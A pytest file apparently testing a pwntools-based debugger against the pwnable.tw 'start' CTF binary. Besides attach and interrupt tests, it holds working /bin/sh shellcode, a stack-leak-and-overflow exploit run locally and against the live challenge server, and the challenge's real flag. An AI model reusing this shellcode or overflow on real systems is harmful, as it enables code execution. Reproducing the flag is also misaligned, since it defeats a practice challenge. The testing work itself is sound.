"""pwnable.tw 'start' (i386, static): local process, attach, and the live server."""
import pytest
from pwn import args, context, p32, process, unpack

from support.local_server import serve_binary

SHELLCODE = b"\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x31\xC9\x31\xD2\xcd\x80"


def test_interrupt_while_waiting_for_input(debugger, challenge):
    """
    Against a local server (remote()), interrupt() while the i386 static binary waits for input stops it at the expected
    offset.
    """
    path = challenge("start")
    with serve_binary([path]) as (host, port):
        dbg = debugger(path).remote(host, port)
        dbg.c(wait=False)
        assert dbg.recv() == b"Let's start the CTF:"
        dbg.interrupt()
        assert dbg.instruction_pointer - dbg.elf.address == 0x99


def test_attach_to_process(debugger, challenge):
    """Debugger(process) on the static i386 challenge keeps its tube: the greeting is received through dbg.p."""
    path = challenge("start")
    with context.local(log_level="error"):
        p = process(path)
    dbg = debugger(p)
    assert dbg.p.recv() == b"Let's start the CTF:"


def test_attach_to_pid(debugger, challenge):
    """Debugger(pid, binary=) on the i386 challenge attaches and closes cleanly."""
    path = challenge("start")
    with context.local(log_level="error"):
        p = process(path)
    assert type(p.pid) is int
    dbg = debugger(p.pid, binary=path)
    dbg.close()
    p.close()


def test_noptrace_against_a_local_server(debugger, challenge):
    """With NOPTRACE, remote() talks to the server and no gdb is started."""
    path = challenge("start")
    with serve_binary([path]) as (host, port), context.local(noptrace=True):
        dbg = debugger(path).remote(host, port)
        assert dbg.recv() == b"Let's start the CTF:"
        assert not dbg.gdb


def _exploit(p):
    p.recv()
    p.send(b"\x90" * 0x14 + p32(0x804808b))
    p.recv(0x18)
    stack = unpack(p.recv(4)) - (0xffb49d00 - 0xffb49ce4)
    p.recv()
    p.send(SHELLCODE.ljust(0x2c, b"\x90") + p32(stack))


def test_exploit_in_remote_mode(debugger, challenge, tmp_path):
    """The legacy test ran this against chall.pwnable.tw. Same exploit, local server."""
    path = challenge("start")
    (tmp_path / "flag").write_text("FLAG{local}\n")
    with serve_binary([path], cwd=tmp_path) as (host, port):
        args.REMOTE = "1"
        dbg = debugger(path).remote(host, port)
        _exploit(dbg.p)
        dbg.p.sendline(b"cat flag")
        assert dbg.p.recvline(timeout=5).strip() == b"FLAG{local}"


@pytest.mark.network
def test_exploit_the_live_server(debugger, challenge):
    """
    The legacy exploit against the real chall.pwnable.tw server: it must still pop a shell and read the real flag (needs
    the network).
    """
    path = challenge("start")
    args.REMOTE = "1"
    dbg = debugger(path).remote("chall.pwnable.tw", 10000)
    _exploit(dbg.p)
    dbg.p.sendline(b"cat /home/start/flag")
    assert dbg.p.recv().strip() == b"FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}"
